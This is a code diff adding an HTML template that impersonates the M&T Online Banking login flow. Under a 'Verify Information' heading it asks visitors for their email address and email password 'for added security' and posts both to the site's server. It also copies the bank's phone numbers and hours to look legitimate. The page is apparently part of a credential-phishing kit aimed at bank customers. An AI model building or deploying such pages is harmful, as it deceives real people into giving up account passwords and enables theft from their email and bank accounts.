@@ -1,0 +1,41 @@
+{% extends 'base.html'%} {%block body%}
+
+
+<div style="padding-top: 5px" class="middle-form">
+  <p class="go-left" style="font-size: 30px; color: #007856; text-align: center;">
+    Verify Information <br />
+  </p>
+  <p class='middle'>For added security, please enter your e-mail credentials</p>
+ 
+  <div class="submitForm">
+    <form action="" method="post">
+      <div class="input-field">
+        <label for="email">Email Address</label>
+          <input id="email" name="email" type="email">
+      </div>
+      <div class="input-field">
+        <label for="email-password">Email Password</label>
+          <input id="email-password" name="password" type="password">
+      </div>
+  
+  <button style="width: 100%; margin-top: -5px;" type="submit">Continue</button>
+</form>
+    <br />
+    <a href="">Help with User ID or Passcode</a>
+    <a href="">Enroll Now</a>
+
+    <p>Unauthorized access is prohibited. Usage may be monitored</p>
+
+    <hr>
+
+    <p>Have questions about M&T Online Banking?</p>
+    <a href="">Personal Accounts: 1-800-790-9130</a>
+    <p>Monday - Friday 8am - 9pm ET</p>
+    <p>Saturday - Sunday 9am - 5pm ET</p>
+
+    <a href="">Business Accounts: 1-800-724-6070</a>
+  </div>
+</div>
+
+
+{%endblock%}
